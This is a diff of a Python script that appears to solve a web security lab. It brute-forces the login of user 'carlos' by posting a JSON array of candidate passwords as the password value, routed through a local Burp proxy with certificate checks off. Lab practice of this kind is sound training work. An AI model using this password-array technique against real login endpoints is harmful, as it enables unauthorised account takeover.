@@ -1,15 +1,15 @@
-# WIP - haven't figured out how to script this one yet
-# Have idea of what the requests need to look at but haven't figured out how to get the format
 import sys
 import requests
 import urllib3
 import pandas as pd
+import json 
 
 # Suppress the insecure requests warning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Add proxy for troubleshoot, for urllib3 all proxies should use http
 # Uses the Burp proxy -> Make sure Burp is running
+# Kind of have to go through Burp on this one to get the URL for the successful login
 proxies = {
     'http':'http://127.0.0.1:8080',
     'https':'http://127.0.0.1:8080'
@@ -23,20 +23,12 @@ def password_enum(url):
     for passw in data:
         password_list.append(passw)
         #print(passw)
-
-    #print(new_passwords)
-    new_list = []
-    for pw in password_list:
-        new_list.append(f'"{pw}",')
-    new_list.insert(0,'[')
-    new_list.append(']')
-    print(new_list)
-    #print(new_line_pw)
-    format_pw = '\n'.join(new_list)
-    print(format_pw)
-    user_data = {"username":"carlos", "password":f"{format_pw}","":""}
-    # This is URL encoding, so reqruest doesn't match what is shown in Burp - may need to try a different Python library?
-    r = requests.post(url, data = user_data, verify=False, proxies=proxies)
+    user_dict = {"username":"carlos","password":password_list}
+    #print(user_dict)
+    json_dict = json.dumps(user_dict)
+    #print(json_dict)
+     
+    r = requests.post(url, data = json_dict, verify=False, proxies=proxies)
     print(r.status_code)
     print(r.content)
 
